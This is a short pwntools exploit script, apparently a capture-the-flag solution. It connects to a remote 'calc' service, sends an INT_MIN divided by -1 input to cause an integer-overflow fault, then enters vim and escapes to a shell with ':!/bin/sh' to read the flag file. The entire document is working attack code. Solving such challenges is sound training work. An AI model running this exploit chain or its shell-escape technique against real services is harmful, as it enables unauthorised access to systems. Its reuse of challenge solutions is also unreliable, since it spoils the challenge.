from pwn import *
import time
context.log_level = 'debug'

#p = process('./calc')
p = remote('202.38.95.46',12008)

p.sendlineafter('>>> ','-2147483648/-1')
p.sendlineafter('\n','vim')
time.sleep(3)

#get shell
p.sendline(':!/bin/sh')
p.sendline('cat ./-')
p.recvuntil('flag')
flag = 'flag' + p.recvuntil('}')
print flag

#cat flag
# p.sendline(':e .//-')
# p.recvuntil('flag')
# flag = 'flag' + p.recvuntil('}')
# print flag

p.close()